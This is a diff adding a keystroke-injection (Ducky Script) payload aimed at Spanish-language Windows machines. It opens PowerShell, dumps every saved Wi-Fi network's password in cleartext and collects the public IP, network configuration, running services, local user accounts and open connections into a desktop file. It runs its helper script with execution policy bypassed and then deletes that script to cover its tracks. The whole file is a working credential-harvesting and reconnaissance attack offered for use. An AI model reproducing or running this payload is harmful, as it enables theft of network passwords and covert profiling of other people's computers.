@@ -1,0 +1,50 @@
+DELAY 1000
+CONTROL ESC
+DELAY 1000
+STRING powershell -Verb runAs
+DELAY 1000
+ENTER
+DELAY 2000
+STRING Set-Content -Path "$env:USERPROFILE\Desktop\tmp.ps1" -Value '$profiles = netsh wlan show profiles | Select-String "Perfil de todos los usuarios"; foreach ($profile in $profiles) { $profileName = $profile.ToString().Split(":")[1].Trim(); $profileInfo = netsh wlan show profile name="$profileName" key=clear; $keyContent = ($profileInfo | Select-String "Contenido de la clave").ToString().Split(":")[1].Trim(); "SSID: $profileName - Clave: $keyContent" | Add-Content -Path "$env:USERPROFILE\Desktop\Info.txt" }'
+DELAY 500
+ENTER
+DELAY 500
+STRING New-Item -Path "$env:USERPROFILE\Desktop\Info.txt" -ItemType File
+DELAY 1000
+ENTER
+DELAY 1000
+STRING (Invoke-WebRequest -Uri "https://ifconfig.me/ip").Content > "$env:USERPROFILE\Desktop\Info.txt"
+DELAY 500
+ENTER
+DELAY 500
+STRING ipconfig /all >> "$env:USERPROFILE\Desktop\Info.txt"
+DELAY 500
+ENTER
+DELAY 500
+STRING Get-Service | Where Status -eq "Running" >> "$env:USERPROFILE\Desktop\Info.txt"
+DELAY 500
+ENTER
+DELAY 500
+STRING netsh wlan show profiles >> "$env:USERPROFILE\Desktop\Info.txt"
+DELAY 500
+ENTER 
+DELAY 500 
+STRING Get-LocalUser >> "$env:USERPROFILE\Desktop\Info.txt"
+DELAY 500
+ENTER
+DELAY 500
+STRING netstat -ano >> "$env:USERPROFILE\Desktop\Info.txt"
+DELAY 1000
+ENTER
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\Desktop\tmp.ps1" 
+DELAY 500
+ENTER
+DELAY 500 
+STRING del "$env:USERPROFILE\Desktop\tmp.ps1"
+DELAY 500
+ENTER
+DELAY 500
+STRING exit 
+DELAY 500 
+ENTER
